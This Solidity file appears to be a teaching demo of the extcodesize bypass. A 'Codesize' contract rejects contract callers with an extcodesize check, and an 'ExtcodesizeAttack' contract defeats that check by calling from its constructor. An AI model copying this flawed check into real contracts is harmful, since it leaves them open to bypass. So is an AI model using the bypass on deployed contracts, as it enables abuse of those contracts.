// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

contract Codesize {
    bool public isEOA;

    /// @notice check the size of the code
    function isContract(address _accountAddress) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(_accountAddress)
        }
        return size > 0;
    }
    
    function checkAddress() public {     
        require(!isContract(msg.sender), "no contract allowed");     
        isEOA = true; 
    }
}
 

contract ExtcodesizeAttack {
    bool public isContract;
    address public addr;

    constructor(address _targetAddress) {  
        isContract = Codesize(_targetAddress).isContract(address(this)); 
        addr = address(this); 
        Codesize(_targetAddress).checkAddress(); 
    }
}
